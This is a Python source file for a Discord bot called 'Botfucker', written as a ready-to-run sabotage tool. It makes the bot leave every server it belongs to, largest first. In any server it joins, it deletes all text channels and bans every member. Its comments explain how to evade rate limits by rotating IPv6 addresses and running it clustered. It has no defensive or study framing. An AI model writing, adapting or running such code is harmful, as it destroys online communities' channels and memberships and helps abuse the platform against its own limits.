from discord import (
    ClientUser,
    Guild,
    Intents,
    TextChannel,
)
from discord.ext.commands import (
    AutoShardedBot,
)
from aiohttp import ClientSession, TCPConnector
from logging import getLogger
from socket import AF_INET6
import asyncio

logger = getLogger("botfucker/main")

class Botfucker(AutoShardedBot):
    user: ClientUser
    session: ClientSession

    def __init__(
        self,
    ):
        super().__init__(
            command_prefix=">>_<<",      # no need since we doing it on startup 🤷‍♂️          
            intents=Intents.all(),
            owner_ids=["0000000000000000000000", #
            ],
        )

    async def start(self):
        token = "0000000000000000000000"  # put your token here
        await super().start(token, reconnect=True)


    async def load_extensions(self) -> None:
        await self.load_extension("jishaku")   # just in case you want it to pull source using jishaku 🤷‍♂️  

    async def setup_hook(self):
        await self.load_extensions()
        await super().setup_hook()

    async def close(self):
        if hasattr(self, "session") and self.session is not None:
            await self.session.close()
            self.session = None
        await super().close()

    async def setup_hook(self):
        self.session = ClientSession(
            connector=TCPConnector(family=AF_INET6), # IPv6 caause we can rotate 😭

        )

    async def on_ready(self):
        logger.info(f"Logged in {self.user} ID: {self.user.id}")

        logger.info(f"waiting 1 min for all shards to load up")
        await asyncio.sleep(60)
        logger.info(f"1 min up Leaving all guilds now, rest in peace {self.user}")

        guilds = sorted(self.guilds, key=lambda g: g.member_count, reverse=True)
        
        for g in guilds:
            logger.info(f"Leaving {g.name} (ID: {g.id}) - {g.member_count} members")
            try:
                await g.leave()
                await asyncio.sleep(5)    
                                          # each shard leaves 1 server per 5 seconds 
                                          # when clustered it can be up to 50+ per second when raltelimited switch ipv6s or back to AF_INET to go back to ipv4 
                                          # if the ip is not raltelimited then its the bot itself rip

            except Exception as e:
                logger.warning(f"Failed to leave {g.name} - {e}")


    async def on_guild_join(self, guild: Guild) -> None:   # nuke channels on join lol
        for channel in guild.channels:
            if isinstance(channel, TextChannel):
                try:
                    await channel.delete()
                except:
                    pass

        for member in guild.members:  # ban all members in the guild - this shit ratelimits hella so comment out if its getting hella errors
            if member.id != self.user.id:
                try:
                    await member.ban(reason="lol") # ⚠️👎🤷‍♂️🎯
                except:
                    pass


# YOU GOTTA RUN THIS SHIT CLUSTERED!! IF YOU DONT KNOW HOW TO IDK THEN ! DO NOT DM ME ABOUT HOW TO USE THIS